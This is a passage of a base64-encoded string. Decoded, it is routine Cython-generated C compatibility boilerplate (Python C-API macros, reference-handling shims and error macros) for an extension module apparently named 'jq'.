N0VW5pY29kZU9iamVjdCAqKSh1KSktPndzdHJfbGVuZ3RoKSlcbiAgICAjZWxzZVxuICAgICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0lTX1RSVUUodSkgICAgICAoMCAhPSAobGlrZWx5KFB5VW5pY29kZV9JU19SRUFEWSh1KSkgPyBQeVVuaWNvZGVfR0VUX0xFTkdUSCh1KSA6IFB5VW5pY29kZV9HRVRfU0laRSh1KSkpXG4gICAgI2VuZGlmXG4gICNlbmRpZlxuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0NvbmNhdChhLCBiKSAgICAgIFB5TnVtYmVyX0FkZChhLCBiKVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Db25jYXRTYWZlKGEsIGIpICBQeU51bWJlcl9BZGQoYSwgYilcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0NvbmNhdChhLCBiKSAgICAgIFB5VW5pY29kZV9Db25jYXQoYSwgYilcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0U2FmZShhLCBiKSAgKCh1bmxpa2VseSgoYSkgPT0gUHlfTm9uZSkgfHwgdW5saWtlbHkoKGIpID09IFB5X05vbmUpKSA/XFxcbiAgICAgIFB5TnVtYmVyX0FkZChhLCBiKSA6IF9fUHl4X1B5VW5pY29kZV9Db25jYXQoYSwgYikpXG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbiAgI2lmICFkZWZpbmVkKFB5VW5pY29kZV9EZWNvZGVVbmljb2RlRXNjYXBlKVxuICAgICNkZWZpbmUgUHlVbmljb2RlX0RlY29kZVVuaWNvZGVFc2NhcGUocywgc2l6ZSwgZXJyb3JzKSAgUHlVbmljb2RlX0RlY29kZShzLCBzaXplLCAidW5pY29kZV9lc2NhcGUiLCBlcnJvcnMpXG4gICNlbmRpZlxuICAjaWYgIWRlZmluZWQoUHlVbmljb2RlX0NvbnRhaW5zKVxuICAgICNkZWZpbmUgUHlVbmljb2RlX0NvbnRhaW5zKHUsIHMpICBQeVNlcXVlbmNlX0NvbnRhaW5zKHUsIHMpXG4gICNlbmRpZlxuICAjaWYgIWRlZmluZWQoUHlCeXRlQXJyYXlfQ2hlY2spXG4gICAgI2RlZmluZSBQeUJ5dGVBcnJheV9DaGVjayhvYmopICBQeU9iamVjdF9UeXBlQ2hlY2sob2JqLCAmUHlCeXRlQXJyYXlfVHlwZSlcbiAgI2VuZGlmXG4gICNpZiAhZGVmaW5lZChQeU9iamVjdF9Gb3JtYXQpXG4gICAgI2RlZmluZSBQeU9iamVjdF9Gb3JtYXQob2JqLCBmbXQpICBQeU9iamVjdF9DYWxsTWV0aG9kKG9iaiwgIl9fZm9ybWF0X18iLCAiTyIsIGZtdClcbiAgI2VuZGlmXG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0Zvcm1hdFNhZmUoYSwgYikgICgodW5saWtlbHkoKGEpID09IFB5X05vbmUgfHwgKFB5VW5pY29kZV9DaGVjayhiKSAmJiAhUHlVbmljb2RlX0NoZWNrRXhhY3QoYikpKSkgPyBQeU51bWJlcl9SZW1haW5kZXIoYSwgYikgOiBQeVVuaWNvZGVfRm9ybWF0KGEsIGIpKVxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuICAjZGVmaW5lIF9fUHl4X1B5U2VxdWVuY2VfTGlzdEtlZXBOZXcob2JqKVxcXG4gICAgKGxpa2VseShQeUxpc3RfQ2hlY2tFeGFjdChvYmopICYmIFB5X1JFRkNOVChvYmopID09IDEpID8gX19QeXhfTmV3UmVmKG9iaikgOiBQeVNlcXVlbmNlX0xpc3Qob2JqKSlcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9MaXN0S2VlcE5ldyhvYmopICBQeVNlcXVlbmNlX0xpc3Qob2JqKVxuI2VuZGlmXG4jaWZuZGVmIFB5U2V0X0NoZWNrRXhhY3RcbiAgI2RlZmluZSBQeVNldF9DaGVja0V4YWN0KG9iaikgICAgICAgIF9fUHl4X0lTX1RZUEUob2JqLCAmUHlTZXRfVHlwZSlcbiNlbmRpZlxuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwQTRcbiAgI2RlZmluZSBfX1B5eF9TRVRfUkVGQ05UKG9iaiwgcmVmY250KSBQeV9TRVRfUkVGQ05UKG9iaiwgcmVmY250KVxuICAjZGVmaW5lIF9fUHl4X1NFVF9TSVpFKG9iaiwgc2l6ZSkgUHlfU0VUX1NJWkUob2JqLCBzaXplKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9TRVRfUkVGQ05UKG9iaiwgcmVmY250KSBQeV9SRUZDTlQob2JqKSA9IChyZWZjbnQpXG4gICNkZWZpbmUgX19QeXhfU0VUX1NJWkUob2JqLCBzaXplKSBQeV9TSVpFKG9iaikgPSAoc2l6ZSlcbiNlbmRpZlxuI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTIHx8IENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlNcbiAgI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuICAgICNkZWZpbmUgX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYobywgaSkgUHlMaXN0X0dldEl0ZW1SZWYobywgaSlcbiAgI2VsaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAgICNkZWZpbmUgX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYobywgaSkgKGxpa2VseSgoaSkgPj0gMCkgPyBQeVNlcXVlbmNlX0dldEl0ZW0obywgaSkgOiAoUHlFcnJfU2V0U3RyaW5nKFB5RXhjX0luZGV4RXJyb3IsICJsaXN0IGluZGV4IG91dCBvZiByYW5nZSIpLCAoUHlPYmplY3QqKU5VTEwpKVxuICAjZWxzZVxuICAgICNkZWZpbmUgX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYobywgaSkgUHlTZXF1ZW5jZV9JVEVNKG8sIGkpXG4gICNlbmRpZlxuI2VsaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwXG4gICAgI2RlZmluZSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihvLCBpKSBQeUxpc3RfR2V0SXRlbVJlZihvLCBpKVxuICAjZWxzZVxuICAgICNkZWZpbmUgX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYobywgaSkgX19QeXhfWE5ld1JlZihQeUxpc3RfR2V0SXRlbShvLCBpKSlcbiAgI2VuZGlmXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKG8sIGkpIF9fUHl4X05ld1JlZihQeUxpc3RfR0VUX0lURU0obywgaSkpXG4jZW5kaWZcbiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDBcbiNkZWZpbmUgX19QeXhfUHlEaWN0X0dldEl0ZW1SZWYoZGljdCwga2V5LCByZXN1bHQpIFB5RGljdF9HZXRJdGVtUmVmKGRpY3QsIGtleSwgcmVzdWx0KVxuI2VsaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgfHwgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGU1xuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5RGljdF9HZXRJdGVtUmVmKFB5T2JqZWN0ICpkaWN0LCBQeU9iamVjdCAqa2V5LCBQeU9iamVjdCAqKnJlc3VsdCkge1xuICAqcmVzdWx0ID0gUHlPYmplY3RfR2V0SXRlbShkaWN0LCBrZXkpO1xuICBpZiAoKnJlc3VsdCA9PSBOVUxMKSB7XG4gICAgaWYgKFB5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoUHlFeGNfS2V5RXJyb3IpKSB7XG4gICAgICBQeUVycl9DbGVhcigpO1xuICAgICAgcmV0dXJuIDA7XG4gICAgfVxuICAgIHJldHVybiAtMTtcbiAgfVxuICByZXR1cm4gMTtcbn1cbiNlbHNlXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlEaWN0X0dldEl0ZW1SZWYoUHlPYmplY3QgKmRpY3QsIFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICoqcmVzdWx0KSB7XG4gICpyZXN1bHQgPSBQeURpY3RfR2V0SXRlbVdpdGhFcnJvcihkaWN0LCBrZXkpO1xuICBpZiAoKnJlc3VsdCA9PSBOVUxMKSB7XG4gICAgcmV0dXJuIFB5RXJyX09jY3VycmVkKCkgPyAtMSA6IDA7XG4gIH1cbiAgUHlfSU5DUkVGKCpyZXN1bHQpO1xuICByZXR1cm4gMTtcbn1cbiNlbmRpZlxuI2lmIGRlZmluZWQoQ1lUSE9OX0RFQlVHX1ZJU0lUX0NPTlNUKSAmJiBDWVRIT05fREVCVUdfVklTSVRfQ09OU1RcbiAgI2RlZmluZSBfX1B5eF9WSVNJVF9DT05TVChvYmopICBQeV9WSVNJVChvYmopXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1ZJU0lUX0NPTlNUKG9iailcbiNlbmRpZlxuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgI2RlZmluZSBfX1B5eF9QeVNlcXVlbmNlX0lURU0obywgaSkgUHlTZXF1ZW5jZV9JVEVNKG8sIGkpXG4gICNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9TSVpFKHNlcSkgIFB5X1NJWkUoc2VxKVxuICAjZGVmaW5lIF9fUHl4X1B5VHVwbGVfU0VUX0lURU0obywgaSwgdikgKFB5VHVwbGVfU0VUX0lURU0obywgaSwgdiksICgwKSlcbiAgI2RlZmluZSBfX1B5eF9QeVR1cGxlX0dFVF9JVEVNKG8sIGkpIFB5VHVwbGVfR0VUX0lURU0obywgaSlcbiAgI2RlZmluZSBfX1B5eF9QeUxpc3RfU0VUX0lURU0obywgaSwgdikgKFB5TGlzdF9TRVRfSVRFTShvLCBpLCB2KSwgKDApKVxuICAjZGVmaW5lIF9fUHl4X1B5TGlzdF9HRVRfSVRFTShvLCBpKSBQeUxpc3RfR0VUX0lURU0obywgaSlcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9JVEVNKG8sIGkpIFB5U2VxdWVuY2VfR2V0SXRlbShvLCBpKVxuICAjZGVmaW5lIF9fUHl4X1B5U2VxdWVuY2VfU0laRShzZXEpICBQeVNlcXVlbmNlX1NpemUoc2VxKVxuICAjZGVmaW5lIF9fUHl4X1B5VHVwbGVfU0VUX0lURU0obywgaSwgdikgUHlUdXBsZV9TZXRJdGVtKG8sIGksIHYpXG4gICNkZWZpbmUgX19QeXhfUHlUdXBsZV9HRVRfSVRFTShvLCBpKSBQeVR1cGxlX0dldEl0ZW0obywgaSlcbiAgI2RlZmluZSBfX1B5eF9QeUxpc3RfU0VUX0lURU0obywgaSwgdikgUHlMaXN0X1NldEl0ZW0obywgaSwgdilcbiAgI2RlZmluZSBfX1B5eF9QeUxpc3RfR0VUX0lURU0obywgaSkgUHlMaXN0X0dldEl0ZW0obywgaSlcbiNlbmRpZlxuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICNkZWZpbmUgX19QeXhfUHlUdXBsZV9HRVRfU0laRShvKSBQeVR1cGxlX0dFVF9TSVpFKG8pXG4gICNkZWZpbmUgX19QeXhfUHlMaXN0X0dFVF9TSVpFKG8pIFB5TGlzdF9HRVRfU0laRShvKVxuICAjZGVmaW5lIF9fUHl4X1B5U2V0X0dFVF9TSVpFKG8pIFB5U2V0X0dFVF9TSVpFKG8pXG4gICNkZWZpbmUgX19QeXhfUHlCeXRlc19HRVRfU0laRShvKSBQeUJ5dGVzX0dFVF9TSVpFKG8pXG4gICNkZWZpbmUgX19QeXhfUHlCeXRlQXJyYXlfR0VUX1NJWkUobykgUHlCeXRlQXJyYXlfR0VUX1NJWkUobylcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChvKSBQeVVuaWNvZGVfR0VUX0xFTkdUSChvKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKG8pIFB5VHVwbGVfU2l6ZShvKVxuICAjZGVmaW5lIF9fUHl4X1B5TGlzdF9HRVRfU0laRShvKSBQeUxpc3RfU2l6ZShvKVxuICAjZGVmaW5lIF9fUHl4X1B5U2V0X0dFVF9TSVpFKG8pIFB5U2V0X1NpemUobylcbiAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0dFVF9TSVpFKG8pIFB5Qnl0ZXNfU2l6ZShvKVxuICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZUFycmF5X0dFVF9TSVpFKG8pIFB5Qnl0ZUFycmF5X1NpemUobylcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChvKSBQeVVuaWNvZGVfR2V0TGVuZ3RoKG8pXG4jZW5kaWZcbiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDBcbiAgI2RlZmluZSBfX1B5eF9QeUltcG9ydF9BZGRNb2R1bGVSZWYobmFtZSkgUHlJbXBvcnRfQWRkTW9kdWxlUmVmKG5hbWUpXG4jZWxzZVxuICBzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlJbXBvcnRfQWRkTW9kdWxlUmVmKGNvbnN0IGNoYXIgKm5hbWUpIHtcbiAgICAgIFB5T2JqZWN0ICptb2R1bGUgPSBQeUltcG9ydF9BZGRNb2R1bGUobmFtZSk7XG4gICAgICBQeV9YSU5DUkVGKG1vZHVsZSk7XG4gICAgICByZXR1cm4gbW9kdWxlO1xuICB9XG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgIWRlZmluZWQoUHlVbmljb2RlX0ludGVybkZyb21TdHJpbmcpXG4gICNkZWZpbmUgUHlVbmljb2RlX0ludGVybkZyb21TdHJpbmcocykgUHlVbmljb2RlX0Zyb21TdHJpbmcocylcbiNlbmRpZlxuI2RlZmluZSBfX1B5eF9QeUxvbmdfRnJvbUhhc2hfdCBQeUxvbmdfRnJvbVNzaXplX3RcbiNkZWZpbmUgX19QeXhfUHlMb25nX0FzSGFzaF90ICAgX19QeXhfUHlJbmRleF9Bc1NzaXplX3RcbiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwMDBcbiAgICAjZGVmaW5lIF9fUHl4X1B5U2VuZFJlc3VsdCBQeVNlbmRSZXN1bHRcbiNlbHNlXG4gICAgdHlwZWRlZiBlbnVtIHtcbiAgICAgICAgUFlHRU5fUkVUVVJOID0gMCxcbiAgICAgICAgUFlHRU5fRVJST1IgPSAtMSxcbiAgICAgICAgUFlHRU5fTkVYVCA9IDEsXG4gICAgfSBfX1B5eF9QeVNlbmRSZXN1bHQ7XG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDBBM1xuICB0eXBlZGVmIF9fUHl4X1B5U2VuZFJlc3VsdCAoKl9fUHl4X3B5aXRlcl9zZW5kZnVuYykoUHlPYmplY3QgKml0ZXIsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKipyZXN1bHQpO1xuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9weWl0ZXJfc2VuZGZ1bmMgc2VuZGZ1bmNcbiNlbmRpZlxuI2lmICFDWVRIT05fVVNFX0FNX1NFTkRcbiNkZWZpbmUgX19QWVhfSEFTX1BZX0FNX1NFTkQgMFxuI2VsaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMDAwXG4jZGVmaW5lIF9fUFlYX0hBU19QWV9BTV9TRU5EIDFcbiNlbHNlXG4jZGVmaW5lIF9fUFlYX0hBU19QWV9BTV9TRU5EIDIgIC8vIG91ciBvd24gYmFja3BvcnRlZCBpbXBsZW1lbnRhdGlvblxuI2VuZGlmXG4jaWYgX19QWVhfSEFTX1BZX0FNX1NFTkQgPCAyXG4gICAgI2RlZmluZSBfX1B5eF9QeUFzeW5jTWV0aG9kc1N0cnVjdCBQeUFzeW5jTWV0aG9kc1xuI2Vsc2VcbiAgICB0eXBlZGVmIHN0cnVjdCB7XG4gICAgICAgIHVuYXJ5ZnVuYyBhbV9hd2FpdDtcbiAgICAgICAgdW5hcnlmdW5jIGFtX2FpdGVyO1xuICAgICAgICB1bmFyeWZ1bmMgYW1fYW5leHQ7XG4gICAgICAgIF9fUHl4X3B5aXRlcl9zZW5kZnVuYyBhbV9zZW5kO1xuICAgIH0gX19QeXhfUHlBc3luY01ldGhvZHNTdHJ1Y3Q7XG4gICAgI2RlZmluZSBfX1B5eF9TbG90VHBBc0FzeW5jKHMpICgoUHlBc3luY01ldGhvZHMqKShzKSlcbiNlbmRpZlxuI2lmIENZVEhPTl9VU0VfQU1fU0VORCAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwRjBcbiAgICAjZGVmaW5lIF9fUHl4X1RQRkxBR1NfSEFWRV9BTV9TRU5EICgxVUwgPDwgMjEpXG4jZWxzZVxuICAgICNkZWZpbmUgX19QeXhfVFBGTEFHU19IQVZFX0FNX1NFTkQgKDApXG4jZW5kaWZcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwXG4jZGVmaW5lIF9fUHl4X1B5SW50ZXJwcmV0ZXJTdGF0ZV9HZXQoKSBQeUludGVycHJldGVyU3RhdGVfR2V0KClcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5SW50ZXJwcmV0ZXJTdGF0ZV9HZXQoKSBQeVRocmVhZFN0YXRlX0dldCgpLT5pbnRlcnBcbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMEEwMDAwXG4jaWZkZWYgX19jcGx1c3BsdXNcbmV4dGVybiAiQyJcbiNlbmRpZlxuUHlBUElfRlVOQyh2b2lkICopIFB5TWVtX0NhbGxvYyhzaXplX3QgbmVsZW0sIHNpemVfdCBlbHNpemUpO1xuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuc3RhdGljIGludCBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKFB5T2JqZWN0ICppbnNwZWN0LCBjb25zdCBjaGFyKiBuYW1lLCBpbnQgKndyaXRlX3RvKSB7XG4gICAgaW50IHZhbHVlO1xuICAgIFB5T2JqZWN0ICpweV92YWx1ZSA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoaW5zcGVjdCwgbmFtZSk7XG4gICAgaWYgKCFweV92YWx1ZSkgcmV0dXJuIDA7XG4gICAgdmFsdWUgPSAoaW50KSBQeUxvbmdfQXNMb25nKHB5X3ZhbHVlKTtcbiAgICBQeV9ERUNSRUYocHlfdmFsdWUpO1xuICAgICp3cml0ZV90byA9IHZhbHVlO1xuICAgIHJldHVybiB2YWx1ZSAhPSAtMSB8fCAhUHlFcnJfT2NjdXJyZWQoKTtcbn1cbnN0YXRpYyBpbnQgX19QeXhfaW5pdF9jb192YXJpYWJsZXModm9pZCkge1xuICAgIFB5T2JqZWN0ICppbnNwZWN0O1xuICAgIGludCByZXN1bHQ7XG4gICAgaW5zcGVjdCA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZSgiaW5zcGVjdCIpO1xuICAgIHJlc3VsdCA9XG4jaWYgIWRlZmluZWQoQ09fT1BUSU1JWkVEKVxuICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19PUFRJTUlaRUQiLCAmQ09fT1BUSU1JWkVEKSAmJlxuI2VuZGlmXG4jaWYgIWRlZmluZWQoQ09fTkVXTE9DQUxTKVxuICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19ORVdMT0NBTFMiLCAmQ09fTkVXTE9DQUxTKSAmJlxuI2VuZGlmXG4jaWYgIWRlZmluZWQoQ09fVkFSQVJHUylcbiAgICAgICAgX19QeXhfaW5pdF9jb192YXJpYWJsZShpbnNwZWN0LCAiQ09fVkFSQVJHUyIsICZDT19WQVJBUkdTKSAmJlxuI2VuZGlmXG4jaWYgIWRlZmluZWQoQ09fVkFSS0VZV09SRFMpXG4gICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX1ZBUktFWVdPUkRTIiwgJkNPX1ZBUktFWVdPUkRTKSAmJlxuI2VuZGlmXG4jaWYgIWRlZmluZWQoQ09fQVNZTkNfR0VORVJBVE9SKVxuICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19BU1lOQ19HRU5FUkFUT1IiLCAmQ09fQVNZTkNfR0VORVJBVE9SKSAmJlxuI2VuZGlmXG4jaWYgIWRlZmluZWQoQ09fR0VORVJBVE9SKVxuICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19HRU5FUkFUT1IiLCAmQ09fR0VORVJBVE9SKSAmJlxuI2VuZGlmXG4jaWYgIWRlZmluZWQoQ09fQ09ST1VUSU5FKVxuICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19DT1JPVVRJTkUiLCAmQ09fQ09ST1VUSU5FKSAmJlxuI2VuZGlmXG4gICAgICAgIDE7XG4gICAgUHlfREVDUkVGKGluc3BlY3QpO1xuICAgIHJldHVybiByZXN1bHQgPyAwIDogLTE7XG59XG4jZWxzZVxuc3RhdGljIGludCBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlcyh2b2lkKSB7XG4gICAgcmV0dXJuIDA7ICAvLyBJdFwncyBhIGxpbWl0ZWQgQVBJLW9ubHkgZmVhdHVyZVxufVxuI2VuZGlmXG5cblxuI2lmIGRlZmluZWQoX1dJTjMyKSB8fCBkZWZpbmVkKFdJTjMyKSB8fCBkZWZpbmVkKE1TX1dJTkRPV1MpXG4gICNpZm5kZWYgX1VTRV9NQVRIX0RFRklORVNcbiAgICAjZGVmaW5lIF9VU0VfTUFUSF9ERUZJTkVTXG4gICNlbmRpZlxuI2VuZGlmXG4jaW5jbHVkZSA8bWF0aC5oPlxuI2lmZGVmIE5BTlxuI2RlZmluZSBfX1BZWF9OQU4oKSAoKGZsb2F0KSBOQU4pXG4jZWxzZVxuc3RhdGljIENZVEhPTl9JTkxJTkUgZmxvYXQgX19QWVhfTkFOKCkge1xuICBmbG9hdCB2YWx1ZTtcbiAgbWVtc2V0KCZ2YWx1ZSwgMHhGRiwgc2l6ZW9mKHZhbHVlKSk7XG4gIHJldHVybiB2YWx1ZTtcbn1cbiNlbmRpZlxuI2lmIGRlZmluZWQoX19DWUdXSU5fXykgJiYgZGVmaW5lZChfTERCTF9FUV9EQkwpXG4jZGVmaW5lIF9fUHl4X3RydW5jbCB0cnVuY1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfdHJ1bmNsIHRydW5jbFxuI2VuZGlmXG5cbiNpZm5kZWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDS19SVU5USU1FXG4jZGVmaW5lIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0tfUlVOVElNRSAwXG4jZW5kaWZcbiNpZm5kZWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDS1xuI2RlZmluZSBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0tfUlVOVElNRVxuI2VuZGlmXG4jaWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDS1xuI2RlZmluZSBfX1BZWF9NQVJLX0VSUl9QT1MoZl9pbmRleCwgbGluZW5vKSAgeyBfX3B5eF9maWxlbmFtZSA9IF9fcHl4X2ZbZl9pbmRleF07ICh2b2lkKSBfX3B5eF9maWxlbmFtZTsgX19weXhfbGluZW5vID0gbGluZW5vOyAodm9pZCkgX19weXhfbGluZW5vOyBfX3B5eF9jbGluZW5vID0gX19MSU5FX187ICh2b2lkKSBfX3B5eF9jbGluZW5vOyB9XG4jZWxzZVxuI2RlZmluZSBfX1BZWF9NQVJLX0VSUl9QT1MoZl9pbmRleCwgbGluZW5vKSAgeyBfX3B5eF9maWxlbmFtZSA9IF9fcHl4X2ZbZl9pbmRleF07ICh2b2lkKSBfX3B5eF9maWxlbmFtZTsgX19weXhfbGluZW5vID0gbGluZW5vOyAodm9pZCkgX19weXhfbGluZW5vOyAodm9pZCkgX19weXhfY2xpbmVubzsgfVxuI2VuZGlmXG4jZGVmaW5lIF9fUFlYX0VSUihmX2luZGV4LCBsaW5lbm8sIExuX2Vycm9yKSBcXFxuICAgIHsgX19QWVhfTUFSS19FUlJfUE9TKGZfaW5kZXgsIGxpbmVubykgZ290byBMbl9lcnJvcjsgfVxuXG4jaWZkZWYgQ1lUSE9OX0VYVEVSTl9DXG4gICAgI3VuZGVmIF9fUFlYX0VYVEVSTl9DXG4gICAgI2RlZmluZSBfX1BZWF9FWFRFUk5fQyBDWVRIT05fRVhURVJOX0NcbiNlbGlmIGRlZmluZWQoX19QWVhfRVhURVJOX0MpXG4gICAgI2lmZGVmIF9NU0NfVkVSXG4gICAgI3ByYWdtYSBtZXNzYWdlICgiUGxlYXNlIGRvIG5vdCBkZWZpbmUgdGhlIFwnX19QWVhfRVhURVJOX0NcJyBtYWNybyBleHRlcm5hbGx5LiBVc2UgXCdDWVRIT05fRVhURVJOX0NcJyBpbnN0ZWFkLiIpXG4gICAgI2Vsc2VcbiAgICAjd2FybmluZyBQbGVhc2UgZG8gbm90IGRlZmluZSB0aGUgXCdfX1BZWF9FWFRFUk5fQ1wnIG1hY3JvIGV4dGVybmFsbHkuIFVzZSBcJ0NZVEhPTl9FWFRFUk5fQ1wnIGluc3RlYWQuXG4gICAgI2VuZGlmXG4jZWxzZVxuICAjaWZkZWYgX19jcGx1c3BsdXNcbiAgICAjZGVmaW5lIF9fUFlYX0VYVEVSTl9DIGV4dGVybiAiQyJcbiAgI2Vsc2VcbiAgICAjZGVmaW5lIF9fUFlYX0VYVEVSTl9DIGV4dGVyblxuICAjZW5kaWZcbiNlbmRpZlxuXG4jZGVmaW5lIF9fUFlYX0hBVkVfX2pxXG4jZGVmaW5lIF9fUFlYX0hBVkVfQVBJX19qcVxuXG4jaWZkZWYgX09QRU5NUFxuI2luY2x1ZGUgPG9tcC5oPlxuI2VuZGlmIFxuXG4jaWYgZGVmaW5lZChQWVJFWF9XSVRIT1VUX0FTU0VSVElPTlMpICYmICFkZWZpbmVkKENZVEhPTl9XSVRIT1VUX0FTU0VSVElPTlMpXG4jZGVmaW5lIENZVEhPTl9XSVRIT1VUX0FTU0VSVElPTlNcbiNlbmRpZlxuXG4jZGVmaW5lIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJIDBcbiNkZWZpbmUgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfVVRGOCAwXG4jZGVmaW5lIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HICIiXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zyb21TdHJpbmcgX19QeXhfUHlCeXRlc19Gcm9tU3RyaW5nXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zyb21TdHJpbmdBbmRTaXplIF9fUHl4X1B5Qnl0ZXNfRnJvbVN0cmluZ0FuZFNpemVcbiNkZWZpbmUgX19QeXhfdWNoYXJfY2FzdChjKSAoKHVuc2lnbmVkIGNoYXIpYylcbiNkZWZpbmUgX19QeXhfbG9uZ19jYXN0KHgpICgobG9uZyl4KVxuI2RlZmluZSBfX1B5eF9maXRzX1B5X3NzaXplX3QodiwgdHlwZSwgaXNfc2lnbmVkKSAgKFxcXG4gICAgKHNpemVvZih0eXBlKSA8IHNpemVvZihQeV9zc2l6ZV90KSkgIHx8XFxcbiAgICAoc2l6ZW9mKHR5cGUpID4gc2l6ZW9mKFB5X3NzaXplX3QpICYmXFxcbiAgICAgICAgICBsaWtlbHkodiA8ICh0eXBlKVBZX1NTSVpFX1RfTUFYIHx8XFxcbiAgICAgICAgICAgICAgICAgdiA9PSAodHlwZSlQWV9TU0laRV9UX01BWCkgICYmXFxcbiAgICAgICAgICAoIWlzX3NpZ25lZCB8fCBsaWtlbHkodiA+ICh0eXBlKVBZX1NTSVpFX1RfTUlOIHx8XFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdiA9PSAodHlwZSlQWV9TU0laRV9UX01JTikpKSAgfHxcXFxuICAgIChzaXplb2YodHlwZSkgPT0gc2l6ZW9mKFB5X3NzaXplX3QpICYmXFxcbiAg